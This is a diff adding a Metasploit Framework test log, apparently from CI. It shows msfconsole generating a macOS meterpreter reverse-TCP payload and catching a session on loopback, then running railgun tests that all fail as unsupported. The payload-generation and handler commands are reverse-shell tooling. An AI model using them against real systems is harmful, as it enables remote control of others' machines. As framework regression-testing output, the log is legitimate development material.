@@ -1,0 +1,45 @@
+use osx/x64/meterpreter_reverse_tcp
+[*] Killing all sessions...
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-osx-x---meterpreter-reverse-tcp20220119-1801-a3ti0g -f macho MeterpreterTryToFork=false lport=6061 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mosx/x64/meterpreter_reverse_tcp[0m) [0m> [*] Writing 810224 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-osx-x---meterpreter-reverse-tcp20220119-1801-a3ti0g...
+[4mmsf6[0m payload([1m[31mosx/x64/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 52
+[4mmsf6[0m payload([1m[31mosx/x64/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6061 
+[*] Meterpreter session 53 opened (127.0.0.1:6061 -> 127.0.0.1:49657 ) at 2022-01-19 11:12:48 +0000
+use test/railgun
+[4mmsf6[0m post([1m[31mtest/railgun[0m) [0m> run session=53 addentropy=true verbose=true
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session type: meterpreter
+[!]  * missing Meterpreter features: stdapi_railgun_api, stdapi_railgun_memread
+[*] Running against session 53
+[*] Session type is meterpreter and platform is osx
+[-] FAILED: Should include error information in the results
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_railgun_api: Operation failed: The command is not supported by this Meterpreter type (x64/osx)
+[-] FAILED: Should support functions with no parameters
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_railgun_api: Operation failed: The command is not supported by this Meterpreter type (x64/osx)
+[-] FAILED: Should support functions with literal parameters
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_railgun_api: Operation failed: The command is not supported by this Meterpreter type (x64/osx)
+[-] FAILED: Should support functions with in/out/inout parameter types
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_railgun_api: Operation failed: The command is not supported by this Meterpreter type (x64/osx)
+[-] FAILED: Should support calling multiple functions at once
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_railgun_api_multi: Operation failed: The command is not supported by this Meterpreter type (x64/osx)
+[-] FAILED: Should support writing memory
+[-] Exception: RuntimeError : Invalid parameters.
+[-] FAILED: Should support reading memory
+[-] Exception: RuntimeError : Invalid parameters.
+[-] Post failed: Rex::Post::Meterpreter::RequestError stdapi_railgun_api: Operation failed: The command is not supported by this Meterpreter type (x64/osx)
+[-] Call stack:
+[-]   /Users/runner/work/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:213:in `send_packet_wait_response'
+[-]   /Users/runner/work/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request'
+[-]   /Users/runner/work/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/railgun/library.rb:373:in `process_function_call'
+[-]   /Users/runner/work/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/railgun/library.rb:95:in `call_function'
+[-]   /Users/runner/work/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/railgun/library_wrapper.rb:25:in `method_missing'
+[-]   /Users/runner/work/metasploit-framework/metasploit-framework/test/modules/post/test/railgun.rb:87:in `test_api_function_calls_libc'
+[-]   /Users/runner/work/metasploit-framework/metasploit-framework/test/lib/module_test.rb:18:in `block in run_all_tests'
+[-]   /Users/runner/work/metasploit-framework/metasploit-framework/test/lib/module_test.rb:17:in `each'
+[-]   /Users/runner/work/metasploit-framework/metasploit-framework/test/lib/module_test.rb:17:in `run_all_tests'
+[-]   /Users/runner/work/metasploit-framework/metasploit-framework/test/lib/module_test.rb:57:in `run'
+[*] Post module execution completed
